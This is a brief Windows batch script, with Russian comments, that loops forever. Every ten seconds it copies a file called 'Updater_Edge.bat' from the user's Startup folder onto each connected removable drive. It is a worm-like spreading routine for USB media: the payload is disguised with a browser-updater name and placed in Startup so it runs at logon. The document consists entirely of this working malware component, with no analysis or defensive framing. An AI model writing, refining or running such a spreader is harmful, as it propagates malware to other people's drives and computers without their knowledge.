@echo off
setlocal enabledelayedexpansion

:: Укажите путь к файлу, который нужно скопировать
set "source_file=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Updater_Edge.bat"

:loop
    :: Цикл по всем доступным дискам
    for /f "tokens=1" %%d in ('wmic logicaldisk where "drivetype=2" get deviceid ^| findstr /r "^[A-Z]"') do (
        copy /Y "%source_file%" "%%d\"
    )
    timeout /t 10 > nul
goto loop